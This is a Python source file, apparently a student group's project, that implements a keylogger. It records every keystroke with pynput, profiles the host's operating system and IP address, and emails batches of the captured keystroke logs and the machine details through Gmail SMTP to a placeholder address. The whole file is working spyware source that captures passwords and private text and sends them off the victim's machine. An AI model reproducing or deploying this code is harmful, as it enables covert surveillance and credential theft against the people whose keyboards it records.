import datetime
from pynput.keyboard import Listener
from io import open

from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from smtplib import SMTP
from config import info
import socket
import platform as pl


def enviarcorreo(nombre):
    mensaje = MIMEMultipart("plain")
    aux = str(cont_lote)
    mensaje["From"]=info.correo()
    mensaje["To"] = "correo_destino@gmail.com"

    adjunto = MIMEBase("application","octect-stream")

    adjunto.set_payload(open(nombre,"rb").read())
    if nombre=="config_equipo.txt":
        mensaje["Subject"] = "DatosKeylogger_Grupo4 - Configuracion_PC "
        adjunto.add_header("content-Disposition", 'attachment; filename=info_equipo.txt')
    else:
        mensaje["Subject"] = "DatosKeylogger_Grupo4 - Lote " + aux + ""
        adjunto.add_header("content-Disposition",'attachment; filename= Lote '+aux+ 'info_keylogger.txt')

    mensaje.attach(adjunto)

    smtp = SMTP("smtp.gmail.com",587)
    smtp.starttls()
    smtp.login(info.correo(),info.contra())
    smtp.sendmail(info.correo(),"correo_destino@gmail.com",mensaje.as_string())
    smtp.quit()


def datosequipo():
    rutaconfig="config_equipo.txt"
    archivo = open(rutaconfig, "a")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    s.close()
    perfil_so = [
        'architecture',
        'platform',
        'processor',
        'release',
        'system',
        'uname',
        'node',
        'version'
    ]
    f=obtenerfh()
    archivo.write("Fecha y Hora: "+f+"\n")
    archivo.write(s.getsockname()[0]+"\n")
    for perfil in perfil_so:
        if hasattr(pl, perfil):
            aux='%s: %s' % (perfil, getattr(pl, perfil)())
            aux=aux+"\n"
            archivo.write(aux)
    enviarcorreo(rutaconfig)




def obtenerfh():
    return datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')

Fecha_hoy = obtenerfh()
Fecha_hoy2 = obtenerfh()
milista = []

cont_letras = 0
global cont_lote
cont_lote= 0
global cont
cont = []

for i in range(200):
    cont.append(0)

def imprimir_linea(archivo, key, fecha, n):

    n = str(n)

    if key == "Key.space":
        key = " "
    elif key == "Key.alt_l":
        key = "ATLIZQ"
    elif key == "Key.alt_r":
        key = "ALTDER"
    elif key == "Key.ctrl_l":
        key = "CTRL_IZQ"
    elif key == "Key.ctrl_r":
        key = "CTRL_DER"
    elif key == "Key.backspace":
        key = "BORRAR"
    elif key == "Key.shift":
        key = "BORRAR"
    elif key == "<97>":
        key = "1"
    elif key == "<98>":
        key = "2"
    elif key == "<99>":
        key = "3"
    elif key == "<100>":
        key = "4"
    elif key == "<101>":
        key = "5"
    elif key == "<102>":
        key = "6"
    elif key == "<103>":
        key = "7"
    elif key == "<104>":
        key = "8"
    elif key == "<105>":
        key = "9"

    archivo.write("Caracter " + key + " Registrado: " + fecha +"\n")



def escribir(letra, archivo):
    if letra == "Key.enter":
        archivo.write("\n")
    elif letra == "Key.space":
        archivo.write(" ")
    elif letra == "Key.alt_l":
        archivo.write("ALT")
    elif letra == "Key.backspace":
        archivo.write("%BORRAR%")
    else:
        archivo.write(letra.replace("'", ""))

def corregir(teclado):
    if len(teclado) == 3:
        res = teclado[1]
    else:
        res = teclado.replace("'", "")
    return res


def contar(letra):
    letra = corregir(letra)
    num = ord(letra)
    cont[num] += 1



def Recibirtecla(key):
    global Fecha_hoy
    global Fecha_hoy2
    global cont_letras
    global cont_lote
    global fichero
    global fichero2
    if cont_letras==1:
        datosequipo()


    ruta="Detalle_" + Fecha_hoy + ".txt"
    ruta2="Texto_" + Fecha_hoy2 + ".txt"
    fichero = open(ruta, "a")
    fichero2 = open(ruta2, "a")
    fecha_instante = obtenerfh()
    key = str(key)
    # contar(key)
    cont_letras += 1
    imprimir_linea(fichero, key, fecha_instante, cont_letras)
    escribir(key, fichero2)
    milista.append(key)
    
    if len(milista)%64 == 0:
        cont_lote += 1
        fichero2.close()
        enviarcorreo(ruta2)
        fecha = obtenerfh()

        fichero2 = open(f"Texto_{fecha}.txt", "a")
        Fecha_hoy2 = fecha


    if len(milista)%64 == 0:
        #cont_lote += 1

        fichero.close()
        enviarcorreo(ruta)
        fecha = obtenerfh()

        fichero = open(f"Detalle_{fecha}.txt", "a")
        Fecha_hoy = fecha


def main():
    with Listener(on_press=Recibirtecla) as l:

        l.join()

main()
